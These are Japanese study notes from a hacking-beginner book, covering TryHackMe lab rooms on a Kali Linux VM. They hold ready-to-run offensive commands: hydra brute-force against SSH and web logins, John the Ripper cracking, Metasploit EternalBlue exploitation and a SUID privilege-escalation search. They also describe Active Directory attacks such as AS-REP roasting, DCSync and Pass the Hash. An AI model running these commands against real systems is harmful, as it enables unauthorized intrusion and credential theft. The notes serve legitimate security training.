# 7日間でハッキングを始める本

## 前提

- Kali Linux
    - Parallelsにて環境構築
        - `/Volumes/HDD/Parallels/Kali Linux 2024.2 ARM64.pvm`
    - ID/Pass
        - 共に`parallels`
    - `thm`にてTryHackMeにVPN接続するエイリアス設定済み
    - 基本的に以下の手順で進める
        1. Parallels立ち上げ
        1. ゲストOS（Kali Linux）起動
        1. ゲストOSにて`thm`コマンドでTryHackMeへVPN接続開始
            - フォアグラウンドで実行中の場合はCtrl+C、バックグラウンドで実行中の場合は`sudo pkill openvpn`でVPN接続解除
        1. ホストOSにてTryHackMeへログイン
        1. ホストOSにて任意のルームのターゲットマシンを起動する
    - `7DaysTryHacking 1`として環境構築直後の状態をスナップショットとして保存
    - mitmproxyのapt installが失敗する
        - mitmproxy 11.1.3のパッケージには`/usr/lib/python3/dist-packages/mitmproxy/tools/web/app.py`の231行目で構文エラー`def _require_auth[**P, R](`が含まれており、これはPythonの正しい構文ではないため
        - このバージョンのmitmproxyは、Kali Linuxのarm64環境やPython 3.11.9など一部の環境でインストール時に必ずこのエラーが出ます
        - 以下コマンドで一旦削除した
            ```
            sudo apt remove --purge mitmproxy
            sudo apt autoremove
            ```
        - もし必要であれば以下コマンドで再インストール
            ```
            sudo apt update
            sudo apt install python3 python3-pip python3-dev libffi-dev libssl-dev -y
            sudo pip3 install mitmproxy
            mitmproxy --version
            ```

## Basic Pentesting

- ポートスキャン
    - `nmap`コマンドを実行
        - `nmap -sV -Pn -oN namp.txt -v IPアドレス`
            - `-sV`：開いているポートのサービスバージョンを自動で特定する
            - `-Pn`：事前にICMPリクエストを送信して確認することなく、直接ポートスキャンを実行するオプション
                - ICMPがブロックされていた際にスキャンせずに終了ことを防ぐ
            - `-oN`：スキャン結果を保存する
            - `--script vuln`を行うことで脆弱性の検出も可能
            - `-p <ポート番号>`：指定したポート番号のみスキャンする
            - `-A`：OSバージョンの特定・サービスのバージョンの特定・デフォルトのスクリプト試行をまとめて行う
- 辞書攻撃
    - `dirb`コマンド
        - 引数で指定したファイルに載っている文字列と同じ名前のディレクトリの存在を確かめる
        - 構文
            - `dirb <ターゲットURL> [ワードリストファイル] [オプション]`
            - 例：`dirb http://IPアドレス /usr/share/dirb/wordlists/small.txt`
        - ワードリストファイルを指定しない場合、デフォルトの辞書ファイルを使用する
    - `hydra`コマンド
        - パスワードクラックツール
        - 構文
            - `hydra -l <ユーザー名> -P <パスワードリスト> -t <スレッド数> <ターゲット> <プロトコル>`
            - 例
                - SSHのブルートフォース攻撃
                    ```
                    hydra -l admin -P /path/to/password_list.txt -t 4 192.168.1.100 ssh
                    ```
                    - adminユーザーで、パスワードリストを使い、4スレッドで192.168.1.100のSSH認証を試行
                - HTTP認証のテスト
                    ```
                    hydra -l user -P passwords.txt http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"
                    ```
                    - /loginページで、失敗時に”incorrect”が返る場合に認証試行
    - John the Ripper
        - パスワードハッシュ形式の解析ツール
            - 対応ハッシュ形式
                - UNIX系
                    - /etc/passwd, /etc/shadow
                - Windows LM/NTLM
                - MD5, SHA-1, SHA-256, SHA-512
                - ZIP, PDF, Officeファイルのパスワードハッシュ
        - 使い方例
            - 辞書攻撃
                ```
                john --wordlist=/path/to/wordlist.txt hashes.txt
                ```
            - ルールベース攻撃
                ```
                john --wordlist=/path/to/wordlist.txt --rules hashes.txt
                ```
            - 解析結果の表示
                ```
                john --show hashes.txt
                ```
            - 秘密鍵ファイルのパスワード解析
                1. ハッシュ値抽出
                    ```
                    ssh2john id_rsa > hash.txt
                    ```
                1. 解析実行
                    ```
                    john --wordlist=/path/to/wordlist.txt hash.txt
                    ```
- Samba共有フォルダ
    - `smbclient -L IPアドレス`で指定したIPアドレスのサーバで利用可能な共有フォルダやプリンターなどの情報の一覧を取得する

## Blue

- Metasploit Framework
    - オープンソースのセキュリティ評価・脆弱性検証用フレームワーク
    - 主要なモジュールの種類
        - exploit
            - 脆弱性を突いてシステムに侵入するための攻撃コード
        - payload
            - exploit成功後に実行されるプログラム。シェルの取得やリバース接続など。
        - auxiliary
            - ポートスキャン、バージョン検出、ネットワーク解析など、攻撃補助のための機能
        - post
            - 侵入後にパスワードの取得やキーロガーの設置などを行う
        - encoder
            - ペイロードの検出回避や難読化のためのエンコード処理
        - nop
            - 攻撃コードの安定動作のための無操作命令
    - 使い方の概要
        1. ターゲットの選定と情報収集：auxiliaryモジュールでスキャンや調査を実施
        1. 脆弱性の特定と選択：exploitモジュールを選択し、ターゲットの脆弱性に合わせて設定
        1. ペイロードの選択：侵入後に何を行うか（シェル取得、ファイル転送など）を選ぶ
        1. 攻撃の実行：設定を確認し、攻撃を実行
        1. 侵入後の操作：postモジュールで追加操作や情報取得を行う
        - 使用例
            1. msfconsoleの起動
                ```
                msfconsole
                ```
            1. モジュールの検索
                ```
                search CVE-2017-0143
                ```
            1. モジュールの選択
                ```
                use exploit/windows/smb/ms17_010_eternalblue
                ```
            1. モジュールのオプションの確認と設定
                ```
                show options
                set RHOSTS ターゲットマシンのIPアドレス
                set LHOST ローカルマシンのIPアドレス
                ```
            1. エクスプロイトの実行
                ```
                exploit
                ```

## OWASP Juice Shop

- Burp Suite
    - PortSwigger社が開発したWebアプリケーションのセキュリティテストを行うための統合プラットフォーム
    - 主要な機能
        - Proxy：ブラウザとWebサーバ間の通信をインターセプト（傍受）し、内容の確認・編集ができる
        - Scanner：Webアプリの脆弱性を自動で検出（Professional Editionのみ）
        - Intruder：パラメータを自動で変更しながら攻撃を試行（ブルートフォースや辞書攻撃など）
        - Repeater：任意のリクエストを繰り返し送信し、レスポンスを比較・分析
        - Spider：Webサイトをクロールし、構造やリンクを自動で把握
        - Extender：拡張機能を追加して機能を拡張

## Vulnversity

- リバースシェル
    - ターゲットマシンからローカルマシンに向けた接続を行う仕組み
- `nc`コマンド
    - netcatの略で「NetworkをCatenate（連結）する」という意味を持つ
    - 以下のような用途で広く使われる
        - サーバーとクライアント間のデータ送受信
        - ポートスキャン
        - 簡易チャットやファイル転送
        - Webサーバやプロキシサーバの簡易実装
        - ネットワークデバッグやテスト
    - 主な使い方
        ```
        nc [オプション] [ホスト名] [ポート番号]
        ```
    - オプション
        - `-l`：リスニングモード、つまり接続を受け付けるモード
        - `-v`：詳細な情報を表示する
        - `-n`：DNSの解決を行わない
- 権限昇格
    - SUIDを利用して権限昇格する
        - SUIDは、実行するユーザでなくファイル所有者の権限で、プログラム/ファイルを実行するための一時的なパーミッションをユーザーに与える
        - SUIDが設定されたバイナリを探し、利用する手順
            1. `find / -perm -u=s -type f 2>/dev/null`を実行しSUIDが設定されているファイルを探す
            1. GTFOBinsにてSUIDなど脆弱性のある設定のされたバイナリファイルの利用方法を調べる

## Attacktive Directory

- AS-REP Roasting攻撃
    - Kerberous認証を行う際に、クライアントとAS（Authentication Service：認証サービス）とで事前認証を行わない（任意で無効にすることが可能）ユーザの場合に、攻撃者がクライアントのフリをしてAS-REPを窃取する攻撃
        - AS-REPにはパスワードをハッシュ値を使って暗号化されたデータが含まれる
- `Kerbrute`
    - Active Directory（AD）環境で利用されるKerberos認証プロトコルを対象としたブルートフォース攻撃やユーザ列挙を行うためのオープンソースツール
    - 主な機能
        - ユーザ列挙
            - Kerberousの事前認証レスポンスを利用して、ドメイン内に存在する有効なユーザ名を特定する
        - ブルートフォース攻撃
            - ユーザ名とパスワードの組み合わせリストを用いて、有効な認証情報を総当たりで探索する
            - KDC（Key Distribution Center：キー配布センター）への接続が可能であれば、存在するユーザ名やパスワードの特定が可能
        - パスワードスプレー
            - 特定のパスワードを複数のユーザに対して試行し、アカウントロックを回避しながら有効な認証情報を効率よく発見する
- `hashcat`
    - パスワードハッシュの解析やクラッキングに特化したオープンソースのツール
    - 主な特徴
        - 幅広いハッシュアルゴリズム対応
            - 300種類以上のハッシュアルゴリズム（例：MD5、SHA1、SHA-256、SHA-512、bcrypt、LMハッシュなど）に対応
        - 多様な攻撃モード
            - 辞書攻撃、ブルートフォース攻撃、マスク攻撃、コンビネータ攻撃、ルールベース攻撃など、様々な攻撃手法をサポート
        - ハードウェアアクセラレーション
            - CPUだけでなく、GPUやその他のアクセラレータ（FPGAなど）も活用でき、非常に高速に解析が可能
        - 分散パスワードクラッキング
            - 複数のマシンやデバイスを組み合わせて分散処理を行える
- DCSync攻撃
    - MS-DRSRというドメインコントローラ間でのデータ複製に使用されるプロトコルを悪用し、既存のドメインコントローラに対してデータの同期を要求してパスワードハッシュを窃取する攻撃
        - ドメインコントローラを複製できる権限を持ったアカウントを侵害している必要がある
- Pass the Hash攻撃
    - 窃取したターゲットのパスワードのハッシュ値を認証情報としてそのまま使用することでターゲットになりすます攻撃
    - NTLM認証が有効な環境でユーザ名とパスワードハッシュを持っているときに使用できる
        - NTLM認証：ユーザのNTLMハッシュを元にして、ドメインやユーザ名などを含めたハッシュの情報を使うチャレンジ&レスポンス方式の認証の一種
            - パスワードを知らなくてもハッシュさえ持っていればなりすましが可能

